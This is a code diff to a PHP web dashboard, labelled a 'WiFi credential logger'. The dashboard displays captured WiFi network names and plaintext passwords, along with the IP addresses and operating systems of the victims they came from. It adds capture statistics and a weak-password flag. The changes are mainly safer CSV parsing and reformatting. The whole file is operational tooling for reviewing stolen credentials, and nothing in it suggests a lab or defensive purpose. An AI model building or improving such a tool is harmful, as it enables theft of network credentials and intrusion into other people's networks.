@@ -1,6 +1,6 @@
 <?php
 // WiFi credential logger dashboard
-// Single-file implementation
+// Single-file implementation (with safer parsing to avoid table glitches)
 
 date_default_timezone_set('Asia/Kolkata');
 
@@ -36,7 +36,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
 // Simple OS detection from user agent string
 function detectOS($userAgent) {
     $ua = strtolower($userAgent);
-    
+
     if (strpos($ua, 'windows') !== false) return 'Windows';
     if (strpos($ua, 'android') !== false) return 'Android';
     if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false || strpos($ua, 'ios') !== false) {
@@ -44,7 +44,7 @@ function detectOS($userAgent) {
     }
     if (strpos($ua, 'mac os') !== false || strpos($ua, 'macintosh') !== false) return 'macOS';
     if (strpos($ua, 'linux') !== false) return 'Linux';
-    
+
     return 'Unknown';
 }
 
@@ -83,15 +83,17 @@ foreach ($lines as $lineNum => $line) {
     $fields = str_getcsv($line);
     if (count($fields) < 4) continue;
 
-    $ssid = trim($fields[0]);
-    $pass = trim($fields[1]);
-    $sourceIP = trim($fields[2]);
-    $sourceOS = trim($fields[3]);
+    // Null-safe extraction with fallbacks to avoid "IP / OS / SSID / Pass" glitches
+    $ssid     = isset($fields[0]) ? trim($fields[0]) : 'unknown';
+    $pass     = isset($fields[1]) ? trim($fields[1]) : '';
+    $sourceIP = isset($fields[2]) ? trim($fields[2]) : 'offline';
+    $sourceOS = isset($fields[3]) ? trim($fields[3]) : 'unknown';
 
-    // Get current timestamp for display
-    $timestamp = date('Y-m-d H:i:s');
-    $timestampUnix = strtotime($timestamp);
-    $displayTime = $timestampUnix ? date('d M Y, h:i:s a', $timestampUnix) : htmlspecialchars($timestamp);
+    // Only process valid WiFi entries
+    if ($ssid === '' || $ssid === 'unknown' || $pass === '') continue;
+
+    // Use current timestamp for display (log file itself doesn't store time)
+    $timestamp = date('d M Y, h:i:s a');
 
     $totalCaptures++;
 
@@ -99,7 +101,7 @@ foreach ($lines as $lineNum => $line) {
     if (!empty($ssid)) {
         $ssidCount[$ssid] = isset($ssidCount[$ssid]) ? $ssidCount[$ssid] + 1 : 1;
     }
-    
+
     // Track source IPs
     if (!empty($sourceIP)) {
         $ipCount[$sourceIP] = isset($ipCount[$sourceIP]) ? $ipCount[$sourceIP] + 1 : 1;
@@ -109,8 +111,8 @@ foreach ($lines as $lineNum => $line) {
     $totalPasswordLength += $passLength;
 
     // Check password strength (basic)
-    $allLetters = (!empty($pass) && ctype_alpha($pass));
-    $allNumbers = (!empty($pass) && ctype_digit($pass));
+    $allLetters   = ($pass !== '' && ctype_alpha($pass));
+    $allNumbers   = ($pass !== '' && ctype_digit($pass));
     $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
 
     if ($weakPassword) {
@@ -118,21 +120,21 @@ foreach ($lines as $lineNum => $line) {
     }
 
     $captureEntries[] = [
-        'idx' => $lineNum,
-        'time' => $displayTime,
-        'ip' => $sourceIP,
-        'os' => $sourceOS,
-        'ssid' => $ssid,
+        'idx'      => $lineNum,
+        'time'     => $timestamp,
+        'ip'       => $sourceIP,
+        'os'       => $sourceOS,
+        'ssid'     => $ssid,
         'password' => $pass,
-        'len' => $passLength,
-        'weak' => $weakPassword,
+        'len'      => $passLength,
+        'weak'     => $weakPassword,
     ];
 }
 
-$uniqueSSIDs = count($ssidCount);
-$uniqueIPs = count($ipCount);
-$avgPasswordLen = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
-$weakPercentage = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
+$uniqueSSIDs     = count($ssidCount);
+$uniqueIPs       = count($ipCount);
+$avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
+$weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
 // View mode selection
 $viewMode = isset($_GET['view']) ? $_GET['view'] : 'full';
@@ -152,7 +154,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
             color: #e5e7eb;
         }
-        
+
         .page {
             max-width: 1100px;
             margin: 0 auto;
@@ -162,7 +164,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             flex-direction: column;
             gap: 16px;
         }
-        
+
         .page-header {
             display: flex;
             flex-wrap: wrap;
@@ -170,34 +172,34 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             justify-content: space-between;
             gap: 12px;
         }
-        
+
         .title-group {
             display: flex;
             flex-direction: column;
             gap: 4px;
         }
-        
+
         .title {
             font-size: 22px;
             font-weight: 600;
         }
-        
+
         .subtitle {
             font-size: 12px;
             color: #9ca3af;
         }
-        
+
         .viewer-meta {
             font-size: 11px;
             color: #9ca3af;
         }
-        
+
         .actions {
             display: flex;
             flex-wrap: wrap;
             gap: 8px;
         }
-        
+
         .btn {
             font-size: 12px;
             border-radius: 999px;
@@ -207,22 +209,22 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             color: #e5e7eb;
             cursor: pointer;
         }
-        
+
         .btn:hover {
             border-color: #4f46e5;
             box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
         }
-        
+
         .btn-danger {
             border-color: rgba(248,113,113,0.7);
             color: #fecaca;
             background: linear-gradient(135deg, rgba(127,29,29,0.9), rgba(127,29,29,0.6));
         }
-        
+
         .btn-danger:hover {
             box-shadow: 0 0 0 1px rgba(248,113,113,0.7);
         }
-        
+
         .btn-sm {
             padding: 4px 8px;
             font-size: 11px;
@@ -233,21 +235,21 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
             gap: 12px;
         }
-        
+
         .stat-card {
             background: #0f172a;
             border-radius: 10px;
             padding: 10px 12px;
             border: 1px solid rgba(148,163,184,0.25);
         }
-        
+
         .stat-label {
             font-size: 11px;
             text-transform: uppercase;
             letter-spacing: 0.08em;
             color: #9ca3af;
         }
-        
+
         .stat-value {
             margin-top: 4px;
             font-size: 18px;
@@ -262,19 +264,19 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             box-shadow: 0 22px 45px rgba(15,23,42,0.7);
             padding: 12px 14px;
         }
-        
+
         table {
             width: 100%;
             border-collapse: collapse;
             font-size: 12px;
         }
-        
+
         th, td {
             padding: 6px 8px;
             border-bottom: 1px solid rgba(55,65,81,0.8);
             text-align: left;
         }
-        
+
         th {
             font-size: 11px;
             text-transform: uppercase;
@@ -282,32 +284,32 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             color: #9ca3af;
             background: radial-gradient(circle at top left, rgba(79,70,229,0.25), transparent 60%);
         }
-        
+
         tr:hover {
             background: rgba(31,41,55,0.7);
         }
-        
+
         .badge {
             display: inline-block;
             border-radius: 999px;
             padding: 2px 6px;
             font-size: 10px;
         }
-        
+
         .badge-weak {
             background: rgba(248,113,113,0.18);
             color: #fecaca;
         }
-        
+
         .badge-ok {
             background: rgba(74,222,128,0.18);
             color: #bbf7d0;
         }
-        
+
         .password {
             font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
         }
-        
+
         .footer {
             margin-top: auto;
             font-size: 11px;
@@ -325,24 +327,23 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
-            
+
             if (refreshTimer) {
                 clearInterval(refreshTimer);
                 refreshTimer = null;
             }
-            
+
             var toggleBtn = document.getElementById('auto-refresh-toggle');
-            
+
             if (autoRefresh) {
                 refreshTimer = setInterval(function() {
                     window.location.reload();
                 }, REFRESH_INTERVAL);
-                
+
                 if (toggleBtn) {
                     toggleBtn.innerText = 'Auto-refresh: ON';
                 }
-                
-                // Save preference
+
                 if (window.localStorage) {
                     localStorage.setItem('wifi_dashboard_auto_refresh', 'on');
                 }
@@ -350,7 +351,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
                 if (toggleBtn) {
                     toggleBtn.innerText = 'Auto-refresh: OFF';
                 }
-                
+
                 if (window.localStorage) {
                     localStorage.setItem('wifi_dashboard_auto_refresh', 'off');
                 }
